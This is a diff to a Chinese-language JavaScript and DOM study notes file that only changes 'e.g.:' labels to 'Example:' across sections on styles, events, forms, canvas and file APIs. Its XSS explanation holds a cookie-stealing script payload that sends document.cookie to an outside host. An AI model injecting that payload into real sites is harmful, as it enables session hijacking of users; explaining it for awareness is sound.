@@ -207,10 +207,10 @@ Document文档根节点
       Arguments:
         str   表示CSS规则的字符串
         index 插入位置
-      e.g.: document.styleSheets[0].insertRule('#block { color:white }', 0);
+      Example: document.styleSheets[0].insertRule('#block { color:white }', 0);
     sheet.deleteRule(index); 从样式表中删除一条规则 [IE9-使用removeRule]
       PS：
-      e.g.:document.styleSheets[0].deleteRule(0); //删除样式表中的第一条规则
+      Example:document.styleSheets[0].deleteRule(0); //删除样式表中的第一条规则
   document.styleSheets[0].cssRules; 返回 CSSRuleList [IE9-为rules]
     PS：CSSRuleList 为样式表的CSS规则组成的类数组对象
   var rule =document.styleSheets[0].cssRules[0]; 表示样式表的一条规则
@@ -218,9 +218,9 @@ Document文档根节点
       CSSRule 对象表示样式表中的一条规则,是一个供其他多种类型继承的基类型,
       其中常见的就是 CSSStyleRule 类型
     rule.selectorText; 返回当前规则的选择器
-      e.g.:document.styleSheets[0].cssRules[0].selectorText; // ".myClass"
+      Example:document.styleSheets[0].cssRules[0].selectorText; // ".myClass"
     rule.style;   规则样式声明,即选择器大括号内的部分
-      e.g.:
+      Example:
       document.styleSheets[0].cssRules[0].style.color = 'red';
     rule.cssText; 返回该规则的字符串表示
       // "body { background-color: red; margin: 20px; }"
@@ -228,7 +228,7 @@ Document文档根节点
     rule.parentRule; 返回包含当前规则的那条CSS规则
       若当前规则是顶层规则,则该属性返回null.
     rule.media; [当一条规则为@media代码块]返回@media代码块的media规则
-    e.g.:
+    Example:
       假设这条规则位于页面中的第一个样式表中,且样式表中只有这一条规则
       div.box{ background-color:blue; width:100px; }
       var sheet =document.styleSheets[0];
@@ -271,7 +271,7 @@ Document文档根节点
     Arguments:
       str 为一伪元素字符串(如":after"),若不需要可为null或''
         IE不支持获取伪类 [?]
-    e.g.:
+    Example:
       var color = window.getComputedStyle(elm, ':before').color;
       var color = window.getComputedStyle(elm, ':before')
       .getPropertyValue('color');
@@ -316,7 +316,7 @@ Document文档根节点
   document.importNode(nod,bool); 复制插入节点(HTML中不常用,XML中常用)
     PS：将外部文档的一个节点拷贝一份,然后可以把这个拷贝的节点插入到当前文档中
       源节点不会从外部文档中删除,被导入的节点是源节点的一个拷贝.
-    e.g.:
+    Example:
     var iframe = document.getElementsByTagName("iframe")[0];
     var oldNode = iframe.contentDocument.getElementById("myNode");
     var newNode = document.importNode(oldNode, true);
@@ -506,7 +506,7 @@ Document文档根节点
       elem.style.XX   读写指定的行内样式
       elem.style.cssText; 取/设style特性中的CSS代码
         可以读写或删除整个样式
-        e.g.:
+        Example:
         elem.style.cssText ='background-color:red;'+'border:1px solid black;';
       elem.style.length; CSS属性的数量
       elem.style.parentRule; CSS信息的CSSRule对象
@@ -520,7 +520,7 @@ Document文档根节点
         animation-play-state属性可以控制动画的状态,暂停/播放,需加上浏览器前缀
         "paused"    暂停
         "running"   播放
-      e.g.:
+      Example:
         elm.style.color = 'black';
         elm.style.cssText ='color:red;line-height:30px';
         elm.style.removeProperty('color');
@@ -837,7 +837,7 @@ DOM操作归纳总结
     var opt = new Options(["文本","值",bool,bool]); 创建option对象 
       两个 bool 分别表示是否被选中和是否有效
       [详见 表单脚本]
-      e.g.:
+      Example:
       var elem=document.getElementById('mySelect');
       elem.add(new Option("文本","值")); // 这个只能在IE中有效
       // 这个兼容IE与firefox
@@ -855,7 +855,7 @@ DOM操作归纳总结
       document.head HTML的head节点
       id名称 JS中直接使用元素的id名称即代表该元素
         前提是id名称是一符合标准的变量名称
-        e.g.:
+        Example:
           <div id="box"> </div>
           box.innerHTML = '直接使用id名称就可以了';
     选择器获取
@@ -985,12 +985,12 @@ DOM操作归纳总结
         elem.getAttribute("value") input表单中value的值 [不会实时动态的更新]
           var a = elem.getAttribute("value")
           返回值为input的值,html中指定的值,相当于 elem.defaultValue;
-        e.g.:
+        Example:
           elem.getAttribute('class'); // 获取class属性的值
       elem.setAttribute("属性名","属性值") 设置指定属性的值
         (详见: HTMLElement)
       elem.removeAttribute("属性名") 删除属性 [详见: HTMLElement 类型]
-        e.g.:
+        Example:
           elem.removeAttribute("class");
       ◆自定义属性
       elem.dataset.XX;  获取自定义元素属性的值 [详见: DOM扩展>HTML5]
@@ -1093,7 +1093,7 @@ DOM操作归纳总结
           rule1.style.color ='red';
         }
       获取计算后的样式
-        e.g.:
+        Example:
           //可获取计算后的样式(计算后的样式包括设置后的样式和默认样式)
           var box=document.getElementById("box");
           var style=window.getComputedStyle(box,null);
@@ -1518,7 +1518,7 @@ Event事件对象
        elapsedTime： transition效果持续的秒数,不含transition-delay的时间.
        pseudoElement：若transition效果发生在伪元素,会返回该伪元素的名称,以“::”开头.
          若不发生在伪元素上,则返回一个空字符串.
-     e.g.:
+     Example:
      elem.addEventListener('transitionend',function(){},false);
      实际使用transitionend事件时,可能需要添加浏览器前缀.
      el.addEventListener('webkitTransitionEnd',function() {});
@@ -1535,7 +1535,7 @@ Event事件对象
     pageshow  网页重载时触发
      PS：重载时会在load事件触发后触发,若页面来自bfcache,则在页面状态完全恢复时触发;
        虽然这个事件的目标是 document,但必须将其事件处理程序添加到 window 上;
-     e.g.:
+     Example:
        var EventUtil = {
          addHandler: function (element, type, handler) {
            if (element.addEventListener) {
@@ -1827,7 +1827,7 @@ Event事件对象
         elem.attachEvent("on" + type, handle);
       }
     };
-    e.g.:
+    Example:
       var t = document.getElementById('test');
       addEvent(t, 'click', function(){});
   事件移除
@@ -1838,11 +1838,11 @@ Event事件对象
         elem.detachEvent('on' + type, handle);
       }
     };
-    e.g.:
+    Example:
       var t = document.getElementById('test');
       deleteEvent(t, 'click', fn);
   对事件的认识
-    e.g.:
+    Example:
       $('#btn').on('click',function(){
         $(this).addClass('aoo');
         if ($(this).hasClass('aoo')) { 
@@ -1856,7 +1856,7 @@ Event事件对象
         }
         $(this).addClass('aoo');
       })
-e.g.:  
+Example:  
   给按钮添加一个点击click事件
     获取按钮          var bu = document.querySelector("#xxx");
     声明响应的动作.点击后执行   var cli = function(){ console.log("点到我了"); }
@@ -1900,7 +1900,7 @@ Event 事件
     ◆基本触摸事件「在规范中列出并获得跨移动设备广泛实现」
     touchstart  当手指放在屏幕上触发;
     touchmove   当手指在屏幕上滑动时,连续地触发;
-      e.g.:
+      Example:
         指定滑动一定距离执行动作 [self]
         var flagYear =true; // 用于记录滑动起始点的 布尔值
         year.on('touchmove',function(e){
@@ -1928,7 +1928,7 @@ Event 事件
     touchenter   移动的手指进入一个DOM元素
     touchleave   移动手指离开一个DOM元素
     touchcancel  触摸被中断
-    e.g.:
+    Example:
       var EventUtil = {
         addHandler: function(element,type,handler) {
           if(element.addEventListener) {
@@ -2055,7 +2055,7 @@ WeiXin 微信
   表单元素  [self: 使用formElem表示表单元素]
     ◆获取表单元素
     document.forms;  获取页面中所有的表单集合,可通过下标或name值来索引特定的表单
-      e.g.: 通过 document.forms 的下标和name值来获取表单
+      Example: 通过 document.forms 的下标和name值来获取表单
         <form class="" action="index.html" method="post" name="aoo">
           <input type="text" name="field" value="" id>
           <input type="submit" name="" value="">
@@ -2087,7 +2087,7 @@ WeiXin 微信
     formElem.noValidate = true;    将原生的表单验证关闭
       原生的表单验证不完全符合需要,而且出错信息无法指定样式。
       这时,可能需要使用表单对象的noValidate属性,将原生的表单验证关闭。
-      e.g.:关闭原生的表单验证,然后指定submit事件时,让JavaScript接管表单验证
+      Example:关闭原生的表单验证,然后指定submit事件时,让JavaScript接管表单验证
         var form = document.getElementById("myform");
         form.noValidate = true;
         form.onsubmit = validateForm;
@@ -2213,7 +2213,7 @@ WeiXin 微信
     checkboxElem.checked  可写,返回一个布尔值,表示用户是否选中
   radio 单选框控件 
     radioElem.checked 
-      e.g.:只有通过遍历,才能获得用户选中的那个选择框的value。
+      Example:只有通过遍历,才能获得用户选中的那个选择框的value。
         <input type="radio" name="gender" value="Male"> Male </input>
         <input type="radio" name="gender" value="Female"> Female </input>
         <script>
@@ -2460,7 +2460,7 @@ WeiXin 微信
         参数为 x,y位置及宽、高尺寸,单位为px
       ctx.strokeRect(x, y, width, height); 绘制一矩形边框
       ctx.clearRect(x, y, width, height); 清除指定矩形区域,让清除部分完全透明
-      e.g.:
+      Example:
         var ctx = canvas.getContext('2d');
         ctx.fillRect(25,25,100,100);
         ctx.clearRect(45,45,60,60);
@@ -2510,7 +2510,7 @@ WeiXin 微信
           使用 strokeStyle 和 fillStyle 属性接受符合 CSS 3 规范的颜色值
             rgba() 方法与 rgb() 方法类似,就多了一个用于设置色彩透明度的参数.
             它的有效范围是从 0.0(完全透明)到 1.0(完全不透明).
-            e.g.:
+            Example:
               可以用下面的写法来设置具有透明度的颜色.
               ctx.strokeStyle = "rgba(255,0,0,0.5)";
               ctx.fillStyle = "rgba(255,0,0,0.5)";
@@ -2532,7 +2532,7 @@ WeiXin 微信
           所谓交接处长度(斜接长度)是指线条交接处内角顶点到外角顶点的长度
         ctx.setLineDash(segments); 设置当前虚线样式
           接受一个数组,来指定线段与间隙的交替
-          e.g.:
+          Example:
             创建一个行军蚁的效果
             var ctx = document.getElementById('canvas').getContext('2d');
             var offset = 0;
@@ -2559,7 +2559,7 @@ WeiXin 微信
         ctx.createRadialGradient(x1, y1, r1, x2, y2, r2)
           接受 6 个参数,前三个定义一个以 (x1,y1) 为原点,半径为 r1 的圆,
           后三个参数则定义另一个以 (x2,y2) 为原点,半径为 r2 的圆.
-          e.g.:
+          Example:
             var lineargradient = ctx.createLinearGradient(0,0,150,150);
             var radialgradient = ctx.createRadialGradient(75,75,0,75,75,100);
         gradient.addColorStop(position, color)
@@ -2568,7 +2568,7 @@ WeiXin 微信
           表示渐变中颜色所在的相对位置.例如,0.5 表示颜色会出现在正中间.
           color 参数必须是一个有效的 CSS 颜色值(如 #FFF, rgba(0,0,0,1),等等).
           可以根据需要添加任意多个色标(color stops).
-          e.g.:
+          Example:
             线性黑白渐变
               var lineargradient = ctx.createLinearGradient(0,0,150,150);
               lineargradient.addColorStop(0,'white');
@@ -2624,7 +2624,7 @@ WeiXin 微信
             图案跟渐变类似,创建出一个pattern之后,赋给fillStyle或strokeStyle即可
           Image 可以是一个 Image 对象的引用,或者另一个 canvas 对象.
           Type 必须是下面的字符串值之一：repeat,repeat-x,repeat-y 和 no-repeat.
-          e.g.:
+          Example:
             var ctx = document.getElementById('canvas').getContext('2d');
             var img = new Image();
             img.src = 'images/wallpaper.png';
@@ -2643,7 +2643,7 @@ WeiXin 微信
           其数值并不跟像素数量挂钩,也不受变换矩阵的影响,默认为 0.
         shadowColor = color 用于设定阴影颜色效果
           shadowColor 是标准的 CSS 颜色值,默认是全透明的黑色.
-        e.g.:
+        Example:
           文字阴影
             var ctx = document.getElementById('canvas').getContext('2d');
             ctx.shadowOffsetX = 2;
@@ -2677,7 +2677,7 @@ WeiXin 微信
         根据给定的控制点和半径画一段圆弧,再以直线连接两个控制点.
       ★贝塞尔bezier以及二次贝塞尔
         一次以及二次贝塞尔曲线都十分有用,一般用来绘制复杂有规律的图形.
-        e.g.:
+        Example:
           使用贝赛尔曲线绘制对话气泡
             var ctx = canvas.getContext('2d');
             ctx.beginPath();
@@ -2713,7 +2713,7 @@ WeiXin 微信
         两个可能的值：
            "nonzero"    non-zero winding rule, 默认值.
            "evenodd"    even-odd winding rule.
-        e.g.:
+        Example:
           var ctx = document.getElementById('canvas').getContext('2d');
           ctx.beginPath();
           ctx.arc(50, 50, 30, 0, Math.PI*2, true);
@@ -2724,7 +2724,7 @@ WeiXin 微信
         绘制的最大宽度是可选的
       ctx.strokeText(text, x, y [, maxWidth]); 在指定的(x,y)位置绘制文本边框
         绘制的最大宽度是可选的
-      e.g.:
+      Example:
         var ctx = document.getElementById('canvas').getContext('2d');
         ctx.font = "48px serif";
         ctx.fillText("Hello world", 10, 50);
@@ -2743,13 +2743,13 @@ WeiXin 微信
         默认值是 alphabetic.
       ctx.direction = value 文本方向.
         可能的值包括：ltr, rtl, inherit.默认值是 inherit.
-      e.g.:
+      Example:
         ctx.font = "48px serif";
         ctx.textBaseline = "hanging";
         ctx.strokeText("Hello world", 0, 100);
       ctx.measureText() 文本测量
         将返回一个 TextMetrics对象的宽度、所在像素,这些体现文本特性的属性.
-        e.g.:
+        Example:
           var ctx = document.getElementById('canvas').getContext('2d');
           var text = ctx.measureText("foo"); // TextMetrics object
           text.width; // 16;
@@ -2803,14 +2803,14 @@ WeiXin 微信
         通过 data: url 方式嵌入图像
           我们还可以通过 data:url 方式来引用图像.
           Data urls 允许用一串 Base64 编码的字符串的方式来定义一个图片.
-          e.g.:
+          Example:
             img.src = 'data:image/gif;base64,R0lGODlhCwALAIAAAAAA3pn/ZiH5BAEAAAEALAAAAAALAAsAAAIUhA+hkcuO4lmNVindo7qyrIXiGBYAOw==';
             其优点就是图片内容即时可用,无须再到服务器兜一圈.
             (还有一个优点是,可以将 CSS,JavaScript,HTML 和 图片全部封装在一起,迁移起来十分方便.)
             缺点就是图像没法缓存,图片大的话内嵌的 url 数据会相当的长：
         使用视频帧
           你还可以使用<video> 中的视频帧(即便视频是不可见的).
-          e.g.:
+          Example:
             例如,若你有一个ID为“myvideo”的<video> 元素,你可以这样做：
             var canvas = document.getElementById('canvas');
             if (canvas.getContext) {
@@ -2824,7 +2824,7 @@ WeiXin 微信
           其中 image 是 image 或者 canvas 对象,
           x 和 y 是其在目标 canvas 里的起始坐标.
           SVG图像必须在 <svg> 根指定元素的宽度和高度.
-          e.g.:
+          Example:
             var ctx = document.getElementById('canvas').getContext('2d');
             var img = new Image();
             img.src = 'images/backdrop.png';
@@ -2844,7 +2844,7 @@ WeiXin 微信
           drawImage 方法的又一变种是增加了两个用于控制图像在 canvas 中缩放的参数.
           这个方法多了2个参数：width 和 height,
           这两个参数用来控制 当像canvas画入时应该缩放的大小
-          e.g.:
+          Example:
             图像大小被缩放至 50*38 px
             var ctx = document.getElementById('canvas').getContext('2d');
             var img = new Image();
@@ -2858,7 +2858,7 @@ WeiXin 微信
             drawImage 方法的第三个也是最后一个变种有8个新参数,用于控制做切片显示的.
           第一个参数和其它的是相同的,都是一个图像或者另一个 canvas 的引用.
           前4个是定义图像源的切片位置和大小,后4个则是定义切片后目标显示位置和大小.
-          e.g.:
+          Example:
             相册
               24-bit PNG 图像带有一个完整的 8-bit alpha 通道,与 GIF 和 8-bit PNG 不同,
               可以将它放成背景而不必担心底色的问题.
@@ -2900,7 +2900,7 @@ WeiXin 微信
         Path2D API 添加了 addPath作为将path结合起来的方法.
         当你想要从几个元素中来创建对象时,这将会很实用.比如：
         添加了一条路径到当前路径(可能添加了一个变换矩阵).
-      e.g.:
+      Example:
         在这个例子中,我们创造了一个矩形和一个圆.
         它们都被存为Path2D对象,后面再派上用场.
         随着新的Path2D API产生,几种方法也相应地被更新来使用Path2D对象而不是当前路径.
@@ -2916,7 +2916,7 @@ WeiXin 微信
       使用 SVG paths
         新的Path2D API有另一个强大的特点,就是使用SVG path data来初始化canvas上的路径.
         这将使你获取路径时可以以SVG或canvas的方式来重用它们.
-        e.g.:
+        Example:
           这条路径将先移动到点 (M10 10) 然后再水平移动80个单位 (h 80),
           然后下移80个单位 (v 80),接着左移80个单位 (h -80),再回到起点处 (z).
           var p = new Path2D("M10 10 h 80 v 80 h -80 Z");
@@ -2987,7 +2987,7 @@ WeiXin 微信
         direction  逆/顺时针旋转.true为逆时针,false为顺时针.
       ctx.closePath(); 闭合路径
     ◆图片绘制
-      e.g.:
+      Example:
       var ctx = document.getElementById("mycanvas").getContext("2d");
       var img=document.getElementById("myImg");
       ctx.beginPath();
@@ -3024,7 +3024,7 @@ WeiXin 微信
       ctx.shadowColor   阴影颜色
       ctx.shadowBlur=num; 模糊等级
     ◆绘制渐变
-      e.g.:
+      Example:
       ctx.beginPath();
       var color=ctx.createLinearGradient(500,500,500,0);
       color.addcolorStop(0.3,"orange");
@@ -3038,7 +3038,7 @@ WeiXin 微信
         x2,y2  渐变结束的坐标
       var color=ctx.createLinearGradient(x1,y1,x2,y2); 定义圆形渐变
       color.addColorStop(小数值,颜色);  添加渐变色
-        e.g.:
+        Example:
         color.addColorStop(0.3,"orange");
         color.addColorStop(0.5,"yellow");
     e.g.
@@ -3061,9 +3061,9 @@ WeiXin 微信
   <a href="#"></a> 超链接
     URL 协议
       URL 支持 javascript: 协议,调用URL时会执行对应的JS代码
-      e.g.: <a href="Javascript:console.log(111);">11111111</a>
+      Example: <a href="Javascript:console.log(111);">11111111</a>
       浏览器地址栏也支持 javascript: 协议
-      e.g.: 将 javascript:console.log(111) 放入地址栏,回车执行
+      Example: 将 javascript:console.log(111) 放入地址栏,回车执行
       若JS代码返回的为字符串,则浏览器会在页面中显示出该字符串
         Chrome: 清空当前页面,显示出返回的字符串
         <a href="Javascript:'aaa'" target="_blank">11111111</a>  
@@ -3102,7 +3102,7 @@ FileList 对象与 File 对象 [HTML5]
     HTML5支持一次选择多个文件,若件选择控件没有开启多选模式,那么数组只有一个元素.
   ◆获取 FileList 和 File 对象 
     PS：FileList 表示files集,files为change事件对象的 e.target.files 
-    e.g.：
+    Example:
       <input type="file" id="file" multiple>
       document.querySelector("#file").addEventListener("change",function(e){
         console.log(this.files);
@@ -3147,7 +3147,7 @@ FileReader 对象  用于读取文件[把文件内容读入内存]
         该字符串每个字节包含一个0到255之间的整数
         可以读取任意类型的文件,而不仅仅是文本文件,返回文件的原始的二进制内容
         与 XMLHttpRequest.sendAsBinary 方法结合使用,可以使用JS上传任意文件到服务器 [?]    
-      e.g.：
+      Example:
         var reader = new FileReader();
         reader.onload = function(e) {
           var rawData = reader.result;
@@ -3176,7 +3176,7 @@ FileReader 对象  用于读取文件[把文件内容读入内存]
     PS：FileReader对象采用异步方式读取文件,可以为一系列事件指定回调函数。
     loadstart 数据读取开始时触发
     progress  数据读取中触发,每50ms左右触发一次 
-      e.g.: 用来显示读取进度
+      Example: 用来显示读取进度
         var reader = new FileReader();
         reader.onprogress = updateProgress;
         function updateProgress(evt) {
@@ -3197,7 +3197,7 @@ FileReader 对象  用于读取文件[把文件内容读入内存]
       3 表示读取中断
       4 文件不可读
       5 编码错误
-      e.g.:
+      Example:
         var reader = new FileReader();
         reader.onerror = errorHandler;
         function errorHandler(evt) {
@@ -3224,7 +3224,7 @@ FileReader 对象  用于读取文件[把文件内容读入内存]
       };
       reader.readAsDataURL(f);
     loadend   读取完成后触发,不管是否成功。触发顺序排在 onload 或 onerror 后面 
-  e.g.:
+  Example:
     var reader = new FileReader();
     reader.onload = function(e) {
       console.log(e.target.result);
@@ -3260,7 +3260,7 @@ URL 对象         用于对二进制数据生成URL
     类似于 "blob:http%3A//test.com/666e6730-f45c-47c1-8012-ccc706f17191"
     这个URL可以放置于任何通常可以放置URL的地方,比如img标签的src属性。
   window.URL.revokeObjectURL(objectURL); 使URL失效
-  e.g.:
+  Example:
     在网页插入图片
     var img = document.createElement("img");
     img.src = window.URL.createObjectURL(files[0]);
@@ -3422,7 +3422,7 @@ URL 对象         用于对二进制数据生成URL
       当其它用户浏览该网站时,这段HTML代码会自动执行,从而达到攻击的目的。
       如盗取用户Cookie、破坏页面结构、重定向到其它网站等。
     DOM Based XSS 漏洞: 基于网页DOM结构的攻击,特点是中招的人是少数人
-      e.g.:
+      Example:
         如一个获取他人Cookie的超链接,
         'http://www.a.com?content=<script>window.open(“www.b.com?param=”+document.cookie)</script>',
         当点击这个链接的时候「假设点击者已经登录a.com」,浏览器就会直接打开b.com,
@@ -3430,7 +3430,7 @@ URL 对象         用于对二进制数据生成URL
         当网站接收到该信息时,就盗取了受害者在 a.com 的cookie信息,
         cookie信息中可能存有登录密码,攻击成功！
     Stored XSS 漏洞: 攻击代码已经存储到服务器上或者数据库中
-      e.g.:
+      Example:
         a.com 可以发文章,攻击者登录后在a.com 中发布了一篇文章, 文章中包含了恶意代码,
         <script>window.open(“www.b.com?param=”+document.cookie)</script>,
         保存文章,这时当在查看攻击者的文章时就都中招了,
@@ -3460,7 +3460,7 @@ URL 对象         用于对二进制数据生成URL
       annotation-xml、color-profile、font-face、font-face-src、
       font-face-uri、font-face-format、font-face-name、missing-glyph
       第二个参数是标签相关的配置,提供一个 prototype(以 HTMLElement 的原型为基础创建的对象)
-        e.g.:
+        Example:
           在 HTML 中去使用自定义的标签：
           <div> <x-foo></x-foo> </div>
     HTML Imports
@@ -3490,7 +3490,7 @@ URL 对象         用于对二进制数据生成URL
         修改属性时,参数列表是：属性名称,旧值,新值,命名空间
         删除属性时,参数列表是：属性名称,旧值,null,命名空间
       adoptedCallback：              使用 document.adoptNode(node) 时触发
-      e.g.: 
+      Example: 
         创建一个自定义的 button-hello 按钮,点击时会 alert('hello world')：
         document.registerElement('button-hello', {
           prototype: Object.create(HTMLButtonElement.prototype, {
